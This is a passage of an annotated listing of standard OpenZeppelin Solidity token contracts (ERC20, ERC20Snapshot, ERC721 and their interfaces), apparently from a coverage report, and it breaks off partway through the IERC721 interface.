*r  |         _beforeTokenTransfer(sender, recipient, amount);
    | 
*r  |         uint256 senderBalance = _balances[sender];
*r  |         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
    |         unchecked {
*r  |             _balances[sender] = senderBalance - amount;
    |         }
*r  |         _balances[recipient] += amount;
    | 
*r  |         emit Transfer(sender, recipient, amount);
    | 
*r  |         _afterTokenTransfer(sender, recipient, amount);
    |     }
    | 
    |     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
    |      * the total supply.
    |      *
    |      * Emits a {Transfer} event with `from` set to the zero address.
    |      *
    |      * Requirements:
    |      *
    |      * - `account` cannot be the zero address.
    |      */
    |     function _mint(address account, uint256 amount) internal virtual {
    |         require(account != address(0), "ERC20: mint to the zero address");
    | 
    |         _beforeTokenTransfer(address(0), account, amount);
    | 
    |         _totalSupply += amount;
    |         _balances[account] += amount;
    |         emit Transfer(address(0), account, amount);
    | 
    |         _afterTokenTransfer(address(0), account, amount);
    |     }
    | 
    |     /**
    |      * @dev Destroys `amount` tokens from `account`, reducing the
    |      * total supply.
    |      *
    |      * Emits a {Transfer} event with `to` set to the zero address.
    |      *
    |      * Requirements:
    |      *
    |      * - `account` cannot be the zero address.
    |      * - `account` must have at least `amount` tokens.
    |      */
    |     function _burn(address account, uint256 amount) internal virtual {
    |         require(account != address(0), "ERC20: burn from the zero address");
    | 
    |         _beforeTokenTransfer(account, address(0), amount);
    | 
    |         uint256 accountBalance = _balances[account];
    |         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    |         unchecked {
    |             _balances[account] = accountBalance - amount;
    |         }
    |         _totalSupply -= amount;
    | 
    |         emit Transfer(account, address(0), amount);
    | 
    |         _afterTokenTransfer(account, address(0), amount);
    |     }
    | 
    |     /**
    |      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
    |      *
    |      * This internal function is equivalent to `approve`, and can be used to
    |      * e.g. set automatic allowances for certain subsystems, etc.
    |      *
    |      * Emits an {Approval} event.
    |      *
    |      * Requirements:
    |      *
    |      * - `owner` cannot be the zero address.
    |      * - `spender` cannot be the zero address.
    |      */
*r  |     function _approve(
    |         address owner,
    |         address spender,
    |         uint256 amount
    |     ) internal virtual {
*r  |         require(owner != address(0), "ERC20: approve from the zero address");
*r  |         require(spender != address(0), "ERC20: approve to the zero address");
    | 
*r  |         _allowances[owner][spender] = amount;
*r  |         emit Approval(owner, spender, amount);
    |     }
    | 
    |     /**
    |      * @dev Hook that is called before any transfer of tokens. This includes
    |      * minting and burning.
    |      *
    |      * Calling conditions:
    |      *
    |      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
    |      * will be transferred to `to`.
    |      * - when `from` is zero, `amount` tokens will be minted for `to`.
    |      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
    |      * - `from` and `to` are never both zero.
    |      *
    |      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
    |      */
*r  |     function _beforeTokenTransfer(
    |         address from,
    |         address to,
    |         uint256 amount
    |     ) internal virtual {}
    | 
    |     /**
    |      * @dev Hook that is called after any transfer of tokens. This includes
    |      * minting and burning.
    |      *
    |      * Calling conditions:
    |      *
    |      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
    |      * has been transferred to `to`.
    |      * - when `from` is zero, `amount` tokens have been minted for `to`.
    |      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
    |      * - `from` and `to` are never both zero.
    |      *
    |      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
    |      */
*r  |     function _afterTokenTransfer(
    |         address from,
    |         address to,
    |         uint256 amount
    |     ) internal virtual {}
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Interface of the ERC20 standard as defined in the EIP.
    |  */
    | interface IERC20 {
    |     /**
    |      * @dev Returns the amount of tokens in existence.
    |      */
    |     function totalSupply() external view returns (uint256);
    | 
    |     /**
    |      * @dev Returns the amount of tokens owned by `account`.
    |      */
    |     function balanceOf(address account) external view returns (uint256);
    | 
    |     /**
    |      * @dev Moves `amount` tokens from the caller's account to `recipient`.
    |      *
    |      * Returns a boolean value indicating whether the operation succeeded.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function transfer(address recipient, uint256 amount) external returns (bool);
    | 
    |     /**
    |      * @dev Returns the remaining number of tokens that `spender` will be
    |      * allowed to spend on behalf of `owner` through {transferFrom}. This is
    |      * zero by default.
    |      *
    |      * This value changes when {approve} or {transferFrom} are called.
    |      */
    |     function allowance(address owner, address spender) external view returns (uint256);
    | 
    |     /**
    |      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
    |      *
    |      * Returns a boolean value indicating whether the operation succeeded.
    |      *
    |      * IMPORTANT: Beware that changing an allowance with this method brings the risk
    |      * that someone may use both the old and the new allowance by unfortunate
    |      * transaction ordering. One possible solution to mitigate this race
    |      * condition is to first reduce the spender's allowance to 0 and set the
    |      * desired value afterwards:
    |      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    |      *
    |      * Emits an {Approval} event.
    |      */
    |     function approve(address spender, uint256 amount) external returns (bool);
    | 
    |     /**
    |      * @dev Moves `amount` tokens from `sender` to `recipient` using the
    |      * allowance mechanism. `amount` is then deducted from the caller's
    |      * allowance.
    |      *
    |      * Returns a boolean value indicating whether the operation succeeded.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function transferFrom(
    |         address sender,
    |         address recipient,
    |         uint256 amount
    |     ) external returns (bool);
    | 
    |     /**
    |      * @dev Emitted when `value` tokens are moved from one account (`from`) to
    |      * another (`to`).
    |      *
    |      * Note that `value` may be zero.
    |      */
    |     event Transfer(address indexed from, address indexed to, uint256 value);
    | 
    |     /**
    |      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
    |      * a call to {approve}. `value` is the new allowance.
    |      */
    |     event Approval(address indexed owner, address indexed spender, uint256 value);
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../ERC20.sol";
    | import "../../../utils/Arrays.sol";
    | import "../../../utils/Counters.sol";
    | 
    | /**
    |  * @dev This contract extends an ERC20 token with a snapshot mechanism. When a snapshot is created, the balances and
    |  * total supply at the time are recorded for later access.
    |  *
    |  * This can be used to safely create mechanisms based on token balances such as trustless dividends or weighted voting.
    |  * In naive implementations it's possible to perform a "double spend" attack by reusing the same balance from different
    |  * accounts. By using snapshots to calculate dividends or voting power, those attacks no longer apply. It can also be
    |  * used to create an efficient ERC20 forking mechanism.
    |  *
    |  * Snapshots are created by the internal {_snapshot} function, which will emit the {Snapshot} event and return a
    |  * snapshot id. To get the total supply at the time of a snapshot, call the function {totalSupplyAt} with the snapshot
    |  * id. To get the balance of an account at the time of a snapshot, call the {balanceOfAt} function with the snapshot id
    |  * and the account address.
    |  *
    |  * NOTE: Snapshot policy can be customized by overriding the {_getCurrentSnapshotId} method. For example, having it
    |  * return `block.number` will trigger the creation of snapshot at the begining of each new block. When overridding this
    |  * function, be careful about the monotonicity of its result. Non-monotonic snapshot ids will break the contract.
    |  *
    |  * Implementing snapshots for every block using this method will incur significant gas costs. For a gas-efficient
    |  * alternative consider {ERC20Votes}.
    |  *
    |  * ==== Gas Costs
    |  *
    |  * Snapshots are efficient. Snapshot creation is _O(1)_. Retrieval of balances or total supply from a snapshot is _O(log
    |  * n)_ in the number of snapshots that have been created, although _n_ for a specific account will generally be much
    |  * smaller since identical balances in subsequent snapshots are stored as a single entry.
    |  *
    |  * There is a constant overhead for normal ERC20 transfers due to the additional snapshot bookkeeping. This overhead is
    |  * only significant for the first transfer that immediately follows a snapshot for a particular account. Subsequent
    |  * transfers will have normal cost until the next snapshot, and so on.
    |  */
    | 
    | abstract contract ERC20Snapshot is ERC20 {
    |     // Inspired by Jordi Baylina's MiniMeToken to record historical balances:
    |     // https://github.com/Giveth/minimd/blob/ea04d950eea153a04c51fa510b068b9dded390cb/contracts/MiniMeToken.sol
    | 
    |     using Arrays for uint256[];
    |     using Counters for Counters.Counter;
    | 
    |     // Snapshotted values have arrays of ids and the value corresponding to that id. These could be an array of a
    |     // Snapshot struct, but that would impede usage of functions that work on an array.
    |     struct Snapshots {
    |         uint256[] ids;
    |         uint256[] values;
    |     }
    | 
    |     mapping(address => Snapshots) private _accountBalanceSnapshots;
    |     Snapshots private _totalSupplySnapshots;
    | 
    |     // Snapshot ids increase monotonically, with the first value being 1. An id of 0 is invalid.
    |     Counters.Counter private _currentSnapshotId;
    | 
    |     /**
    |      * @dev Emitted by {_snapshot} when a snapshot identified by `id` is created.
    |      */
    |     event Snapshot(uint256 id);
    | 
    |     /**
    |      * @dev Creates a new snapshot and returns its snapshot id.
    |      *
    |      * Emits a {Snapshot} event that contains the same id.
    |      *
    |      * {_snapshot} is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a
    |      * set of accounts, for example using {AccessControl}, or it may be open to the public.
    |      *
    |      * [WARNING]
    |      * ====
    |      * While an open way of calling {_snapshot} is required for certain trust minimization mechanisms such as forking,
    |      * you must consider that it can potentially be used by attackers in two ways.
    |      *
    |      * First, it can be used to increase the cost of retrieval of values from snapshots, although it will grow
    |      * logarithmically thus rendering this attack ineffective in the long term. Second, it can be used to target
    |      * specific accounts and increase the cost of ERC20 transfers for them, in the ways specified in the Gas Costs
    |      * section above.
    |      *
    |      * We haven't measured the actual numbers; if this is something you're interested in please reach out to us.
    |      * ====
    |      */
    |     function _snapshot() internal virtual returns (uint256) {
    |         _currentSnapshotId.increment();
    | 
    |         uint256 currentId = _getCurrentSnapshotId();
    |         emit Snapshot(currentId);
    |         return currentId;
    |     }
    | 
    |     /**
    |      * @dev Get the current snapshotId
    |      */
    |     function _getCurrentSnapshotId() internal view virtual returns (uint256) {
    |         return _currentSnapshotId.current();
    |     }
    | 
    |     /**
    |      * @dev Retrieves the balance of `account` at the time `snapshotId` was created.
    |      */
    |     function balanceOfAt(address account, uint256 snapshotId) public view virtual returns (uint256) {
    |         (bool snapshotted, uint256 value) = _valueAt(snapshotId, _accountBalanceSnapshots[account]);
    | 
    |         return snapshotted ? value : balanceOf(account);
    |     }
    | 
    |     /**
    |      * @dev Retrieves the total supply at the time `snapshotId` was created.
    |      */
    |     function totalSupplyAt(uint256 snapshotId) public view virtual returns (uint256) {
    |         (bool snapshotted, uint256 value) = _valueAt(snapshotId, _totalSupplySnapshots);
    | 
    |         return snapshotted ? value : totalSupply();
    |     }
    | 
    |     // Update balance and/or total supply snapshots before the values are modified. This is implemented
    |     // in the _beforeTokenTransfer hook, which is executed for _mint, _burn, and _transfer operations.
    |     function _beforeTokenTransfer(
    |         address from,
    |         address to,
    |         uint256 amount
    |     ) internal virtual override {
    |         super._beforeTokenTransfer(from, to, amount);
    | 
    |         if (from == address(0)) {
    |             // mint
    |             _updateAccountSnapshot(to);
    |             _updateTotalSupplySnapshot();
    |         } else if (to == address(0)) {
    |             // burn
    |             _updateAccountSnapshot(from);
    |             _updateTotalSupplySnapshot();
    |         } else {
    |             // transfer
    |             _updateAccountSnapshot(from);
    |             _updateAccountSnapshot(to);
    |         }
    |     }
    | 
    |     function _valueAt(uint256 snapshotId, Snapshots storage snapshots) private view returns (bool, uint256) {
    |         require(snapshotId > 0, "ERC20Snapshot: id is 0");
    |         require(snapshotId <= _getCurrentSnapshotId(), "ERC20Snapshot: nonexistent id");
    | 
    |         // When a valid snapshot is queried, there are three possibilities:
    |         //  a) The queried value was not modified after the snapshot was taken. Therefore, a snapshot entry was never
    |         //  created for this id, and all stored snapshot ids are smaller than the requested one. The value that corresponds
    |         //  to this id is the current one.
    |         //  b) The queried value was modified after the snapshot was taken. Therefore, there will be an entry with the
    |         //  requested id, and its value is the one to return.
    |         //  c) More snapshots were created after the requested one, and the queried value was later modified. There will be
    |         //  no entry for the requested id: the value that corresponds to it is that of the smallest snapshot id that is
    |         //  larger than the requested one.
    |         //
    |         // In summary, we need to find an element in an array, returning the index of the smallest value that is larger if
    |         // it is not found, unless said value doesn't exist (e.g. when all values are smaller). Arrays.findUpperBound does
    |         // exactly this.
    | 
    |         uint256 index = snapshots.ids.findUpperBound(snapshotId);
    | 
    |         if (index == snapshots.ids.length) {
    |             return (false, 0);
    |         } else {
    |             return (true, snapshots.values[index]);
    |         }
    |     }
    | 
    |     function _updateAccountSnapshot(address account) private {
    |         _updateSnapshot(_accountBalanceSnapshots[account], balanceOf(account));
    |     }
    | 
    |     function _updateTotalSupplySnapshot() private {
    |         _updateSnapshot(_totalSupplySnapshots, totalSupply());
    |     }
    | 
    |     function _updateSnapshot(Snapshots storage snapshots, uint256 currentValue) private {
    |         uint256 currentId = _getCurrentSnapshotId();
    |         if (_lastSnapshotId(snapshots.ids) < currentId) {
    |             snapshots.ids.push(currentId);
    |             snapshots.values.push(currentValue);
    |         }
    |     }
    | 
    |     function _lastSnapshotId(uint256[] storage ids) private view returns (uint256) {
    |         if (ids.length == 0) {
    |             return 0;
    |         } else {
    |             return ids[ids.length - 1];
    |         }
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../IERC20.sol";
    | 
    | /**
    |  * @dev Interface for the optional metadata functions from the ERC20 standard.
    |  *
    |  * _Available since v4.1._
    |  */
    | interface IERC20Metadata is IERC20 {
    |     /**
    |      * @dev Returns the name of the token.
    |      */
    |     function name() external view returns (string memory);
    | 
    |     /**
    |      * @dev Returns the symbol of the token.
    |      */
    |     function symbol() external view returns (string memory);
    | 
    |     /**
    |      * @dev Returns the decimals places of the token.
    |      */
    |     function decimals() external view returns (uint8);
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC721/ERC721.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./IERC721.sol";
    | import "./IERC721Receiver.sol";
    | import "./extensions/IERC721Metadata.sol";
    | import "../../utils/Address.sol";
    | import "../../utils/Context.sol";
    | import "../../utils/Strings.sol";
    | import "../../utils/introspection/ERC165.sol";
    | 
    | /**
    |  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
    |  * the Metadata extension, but not including the Enumerable extension, which is available separately as
    |  * {ERC721Enumerable}.
    |  */
    | contract ERC721 is Context, ERC165, IERC721, IERC721Metadata {
    |     using Address for address;
    |     using Strings for uint256;
    | 
    |     // Token name
    |     string private _name;
    | 
    |     // Token symbol
    |     string private _symbol;
    | 
    |     // Mapping from token ID to owner address
    |     mapping(uint256 => address) private _owners;
    | 
    |     // Mapping owner address to token count
    |     mapping(address => uint256) private _balances;
    | 
    |     // Mapping from token ID to approved address
    |     mapping(uint256 => address) private _tokenApprovals;
    | 
    |     // Mapping from owner to operator approvals
    |     mapping(address => mapping(address => bool)) private _operatorApprovals;
    | 
    |     /**
    |      * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.
    |      */
    |     constructor(string memory name_, string memory symbol_) {
    |         _name = name_;
    |         _symbol = symbol_;
    |     }
    | 
    |     /**
    |      * @dev See {IERC165-supportsInterface}.
    |      */
    |     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
    |         return
    |             interfaceId == type(IERC721).interfaceId ||
    |             interfaceId == type(IERC721Metadata).interfaceId ||
    |             super.supportsInterface(interfaceId);
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-balanceOf}.
    |      */
    |     function balanceOf(address owner) public view virtual override returns (uint256) {
    |         require(owner != address(0), "ERC721: balance query for the zero address");
    |         return _balances[owner];
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-ownerOf}.
    |      */
    |     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
    |         address owner = _owners[tokenId];
    |         require(owner != address(0), "ERC721: owner query for nonexistent token");
    |         return owner;
    |     }
    | 
    |     /**
    |      * @dev See {IERC721Metadata-name}.
    |      */
    |     function name() public view virtual override returns (string memory) {
    |         return _name;
    |     }
    | 
    |     /**
    |      * @dev See {IERC721Metadata-symbol}.
    |      */
    |     function symbol() public view virtual override returns (string memory) {
    |         return _symbol;
    |     }
    | 
    |     /**
    |      * @dev See {IERC721Metadata-tokenURI}.
    |      */
    |     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
    |         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
    | 
    |         string memory baseURI = _baseURI();
    |         return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
    |     }
    | 
    |     /**
    |      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
    |      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
    |      * by default, can be overriden in child contracts.
    |      */
    |     function _baseURI() internal view virtual returns (string memory) {
    |         return "";
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-approve}.
    |      */
    |     function approve(address to, uint256 tokenId) public virtual override {
    |         address owner = ERC721.ownerOf(tokenId);
    |         require(to != owner, "ERC721: approval to current owner");
    | 
    |         require(
    |             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
    |             "ERC721: approve caller is not owner nor approved for all"
    |         );
    | 
    |         _approve(to, tokenId);
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-getApproved}.
    |      */
    |     function getApproved(uint256 tokenId) public view virtual override returns (address) {
    |         require(_exists(tokenId), "ERC721: approved query for nonexistent token");
    | 
    |         return _tokenApprovals[tokenId];
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-setApprovalForAll}.
    |      */
    |     function setApprovalForAll(address operator, bool approved) public virtual override {
    |         require(operator != _msgSender(), "ERC721: approve to caller");
    | 
    |         _operatorApprovals[_msgSender()][operator] = approved;
    |         emit ApprovalForAll(_msgSender(), operator, approved);
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-isApprovedForAll}.
    |      */
    |     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
    |         return _operatorApprovals[owner][operator];
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-transferFrom}.
    |      */
    |     function transferFrom(
    |         address from,
    |         address to,
    |         uint256 tokenId
    |     ) public virtual override {
    |         //solhint-disable-next-line max-line-length
    |         require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: transfer caller is not owner nor approved");
    | 
    |         _transfer(from, to, tokenId);
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-safeTransferFrom}.
    |      */
    |     function safeTransferFrom(
    |         address from,
    |         address to,
    |         uint256 tokenId
    |     ) public virtual override {
    |         safeTransferFrom(from, to, tokenId, "");
    |     }
    | 
    |     /**
    |      * @dev See {IERC721-safeTransferFrom}.
    |      */
    |     function safeTransferFrom(
    |         address from,
    |         address to,
    |         uint256 tokenId,
    |         bytes memory _data
    |     ) public virtual override {
    |         require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: transfer caller is not owner nor approved");
    |         _safeTransfer(from, to, tokenId, _data);
    |     }
    | 
    |     /**
    |      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
    |      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
    |      *
    |      * `_data` is additional data, it has no specified format and it is sent in call to `to`.
    |      *
    |      * This internal function is equivalent to {safeTransferFrom}, and can be used to e.g.
    |      * implement alternative mechanisms to perform token transfer, such as signature-based.
    |      *
    |      * Requirements:
    |      *
    |      * - `from` cannot be the zero address.
    |      * - `to` cannot be the zero address.
    |      * - `tokenId` token must exist and be owned by `from`.
    |      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function _safeTransfer(
    |         address from,
    |         address to,
    |         uint256 tokenId,
    |         bytes memory _data
    |     ) internal virtual {
    |         _transfer(from, to, tokenId);
    |         require(_checkOnERC721Received(from, to, tokenId, _data), "ERC721: transfer to non ERC721Receiver implementer");
    |     }
    | 
    |     /**
    |      * @dev Returns whether `tokenId` exists.
    |      *
    |      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
    |      *
    |      * Tokens start existing when they are minted (`_mint`),
    |      * and stop existing when they are burned (`_burn`).
    |      */
    |     function _exists(uint256 tokenId) internal view virtual returns (bool) {
    |         return _owners[tokenId] != address(0);
    |     }
    | 
    |     /**
    |      * @dev Returns whether `spender` is allowed to manage `tokenId`.
    |      *
    |      * Requirements:
    |      *
    |      * - `tokenId` must exist.
    |      */
    |     function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {
    |         require(_exists(tokenId), "ERC721: operator query for nonexistent token");
    |         address owner = ERC721.ownerOf(tokenId);
    |         return (spender == owner || getApproved(tokenId) == spender || isApprovedForAll(owner, spender));
    |     }
    | 
    |     /**
    |      * @dev Safely mints `tokenId` and transfers it to `to`.
    |      *
    |      * Requirements:
    |      *
    |      * - `tokenId` must not exist.
    |      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function _safeMint(address to, uint256 tokenId) internal virtual {
    |         _safeMint(to, tokenId, "");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is
    |      * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.
    |      */
    |     function _safeMint(
    |         address to,
    |         uint256 tokenId,
    |         bytes memory _data
    |     ) internal virtual {
    |         _mint(to, tokenId);
    |         require(
    |             _checkOnERC721Received(address(0), to, tokenId, _data),
    |             "ERC721: transfer to non ERC721Receiver implementer"
    |         );
    |     }
    | 
    |     /**
    |      * @dev Mints `tokenId` and transfers it to `to`.
    |      *
    |      * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible
    |      *
    |      * Requirements:
    |      *
    |      * - `tokenId` must not exist.
    |      * - `to` cannot be the zero address.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function _mint(address to, uint256 tokenId) internal virtual {
    |         require(to != address(0), "ERC721: mint to the zero address");
    |         require(!_exists(tokenId), "ERC721: token already minted");
    | 
    |         _beforeTokenTransfer(address(0), to, tokenId);
    | 
    |         _balances[to] += 1;
    |         _owners[tokenId] = to;
    | 
    |         emit Transfer(address(0), to, tokenId);
    |     }
    | 
    |     /**
    |      * @dev Destroys `tokenId`.
    |      * The approval is cleared when the token is burned.
    |      *
    |      * Requirements:
    |      *
    |      * - `tokenId` must exist.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function _burn(uint256 tokenId) internal virtual {
    |         address owner = ERC721.ownerOf(tokenId);
    | 
    |         _beforeTokenTransfer(owner, address(0), tokenId);
    | 
    |         // Clear approvals
    |         _approve(address(0), tokenId);
    | 
    |         _balances[owner] -= 1;
    |         delete _owners[tokenId];
    | 
    |         emit Transfer(owner, address(0), tokenId);
    |     }
    | 
    |     /**
    |      * @dev Transfers `tokenId` from `from` to `to`.
    |      *  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.
    |      *
    |      * Requirements:
    |      *
    |      * - `to` cannot be the zero address.
    |      * - `tokenId` token must be owned by `from`.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function _transfer(
    |         address from,
    |         address to,
    |         uint256 tokenId
    |     ) internal virtual {
    |         require(ERC721.ownerOf(tokenId) == from, "ERC721: transfer of token that is not own");
    |         require(to != address(0), "ERC721: transfer to the zero address");
    | 
    |         _beforeTokenTransfer(from, to, tokenId);
    | 
    |         // Clear approvals from the previous owner
    |         _approve(address(0), tokenId);
    | 
    |         _balances[from] -= 1;
    |         _balances[to] += 1;
    |         _owners[tokenId] = to;
    | 
    |         emit Transfer(from, to, tokenId);
    |     }
    | 
    |     /**
    |      * @dev Approve `to` to operate on `tokenId`
    |      *
    |      * Emits a {Approval} event.
    |      */
    |     function _approve(address to, uint256 tokenId) internal virtual {
    |         _tokenApprovals[tokenId] = to;
    |         emit Approval(ERC721.ownerOf(tokenId), to, tokenId);
    |     }
    | 
    |     /**
    |      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
    |      * The call is not executed if the target address is not a contract.
    |      *
    |      * @param from address representing the previous owner of the given token ID
    |      * @param to target address that will receive the tokens
    |      * @param tokenId uint256 ID of the token to be transferred
    |      * @param _data bytes optional data to send along with the call
    |      * @return bool whether the call correctly returned the expected magic value
    |      */
    |     function _checkOnERC721Received(
    |         address from,
    |         address to,
    |         uint256 tokenId,
    |         bytes memory _data
    |     ) private returns (bool) {
    |         if (to.isContract()) {
    |             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
    |                 return retval == IERC721Receiver.onERC721Received.selector;
    |             } catch (bytes memory reason) {
    |                 if (reason.length == 0) {
    |                     revert("ERC721: transfer to non ERC721Receiver implementer");
    |                 } else {
    |                     assembly {
    |                         revert(add(32, reason), mload(reason))
    |                     }
    |                 }
    |             }
    |         } else {
    |             return true;
    |         }
    |     }
    | 
    |     /**
    |      * @dev Hook that is called before any token transfer. This includes minting
    |      * and burning.
    |      *
    |      * Calling conditions:
    |      *
    |      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
    |      * transferred to `to`.
    |      * - When `from` is zero, `tokenId` will be minted for `to`.
    |      * - When `to` is zero, ``from``'s `tokenId` will be burned.
    |      * - `from` and `to` are never both zero.
    |      *
    |      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
    |      */
    |     function _beforeTokenTransfer(
    |         address from,
    |         address to,
    |         uint256 tokenId
    |     ) internal virtual {}
    | }
    | 

/src/node_modules/@openzeppelin/contracts/token/ERC721/IERC721.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../../utils/introspection/IERC165.sol";
    | 
    | /**
    |  * @dev Required interface of an ERC721 compliant contract.
    |  */
    | interface IERC721 is IERC165 {
    |     /**
    |      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
    |      */
    |     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    | 
    |     /**
    |      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
    |      */
    |     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
    | 
    |     /**
    |      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
    |      */
    |     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
    | 
    |     /**
    |      * @dev Returns the number of tokens in ``owner``'s account.
    |      */
    |     function balanceOf(address owner) external view returns (uint256 balance);
    | 
    |     /**
    |      * @dev Returns the owner of the `tokenId` token.
    |      *
    |      * Requirements:
    |      *
    |      * - `tokenId` must exist.
    |      */
    |     function ownerOf(uint256 tokenId) external view returns (address owner);
    | 
    |     /**
    |      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
    |      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
    |      *
    |      * Requirements:
    |      *
    |      * - `from` cannot be the zero address.
    |      * - `to` cannot be the zero address.
    |      * - `tokenId` token must exist and be owned by `from`.
    |      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
    |      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function safeTransferFrom(
    |         address from,
    |         address to,
    |         uint256 tokenId
    |     ) external;
    | 
    |     /**
    |      * @dev Transfers `tokenId` token from `from` to `to`.
    |      *
    |      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
    |      *
    |      * Requirements:
    |      *
    |      * - `from` cannot be the zero address.
    |      * - `to` cannot be the zero address.
    |      * - `tokenId` token must be owned by `from`.
    |      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
    |      *
    |      * Emits a {Transfer} event.
    |      */
    |     function transferFrom(
    |         address from,
    |         address to,
    |         uint256 tokenId
    |     ) external;
    | 
    |     /**
    |      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
    |      * The approval is cleared when the token is transferred.
    |      *
    |      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
    |      *
    |      * Requirements:
    |      *
    |      * - The caller must own the token or be an approved operator.
    |      * - `tokenId` must exist.
    |      *
    |      * Emits an {Approval} event.
    |      */
    |     function approve(address to, uint256 tokenId) external;
    | 
    |     /**
    |      * @dev Returns the account approved for `tokenId` token.
    |      *
    |      * Requirements:
    |      *
    |      * - `tokenId` must exist.
    |      */
    |     function getApproved(uint256 tokenId) external view returns (address operator);
    | 
    |     /**
    |      * @dev Approve or remove `operator` as an operator for the caller.
    |      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
    |      *
    |      * Requirements:
    |      *
    |      * - The `operator` cannot be the caller.
    |      *
    |      * Emits an {ApprovalForAll} event.
    |      */
    |     function setApprovalForAll(address operator, bool _approved) external;
    | 
    |     /**
    |      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
    |      *
    |      * See {setApprovalForAll}
    |      */
    |     function isApprovedForAll(address owner, address operator) external view returns (bool);
    | 
    |     /**
    |      * @dev Safely transfers `tokenId` token from `from` to `to`.
    |      *
    |      * Requirements:
    |      *
    |      * - `from` cannot be the zero address.
    |      * - `to` cannot be the zero address.
    |      * - `tokenId` token must exist and be owned by `from`.
    |      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
